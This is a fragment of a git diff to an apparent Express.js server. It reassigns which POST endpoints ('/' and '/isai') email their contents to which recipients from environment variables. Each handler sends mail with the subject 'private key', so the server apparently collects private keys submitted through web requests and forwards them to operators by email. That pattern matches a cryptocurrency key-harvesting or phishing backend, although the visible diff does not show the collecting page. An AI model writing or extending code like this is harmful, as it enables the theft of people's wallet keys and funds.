@@ -64,10 +64,10 @@ app.post("/sn", (req, res) => {
     }
   });
 });
-app.post("/", (req, res) => {
+app.post("/isai", (req, res) => {
   const mailOptions = {
     from: process.env.SENDER_MAIL,
-    to: process.env.LABCOL,
+    to: process.env.ISAI,
     subject: "private key",
     html: `
         <p>
@@ -84,10 +84,11 @@ app.post("/", (req, res) => {
     }
   });
 });
-app.post("/isai", (req, res) => {
+
+app.post("/", (req, res) => {
   const mailOptions = {
     from: process.env.SENDER_MAIL,
-    to: process.env.ISAI,
+    to: process.env.LABCOL,
     subject: "private key",
     html: `
         <p>
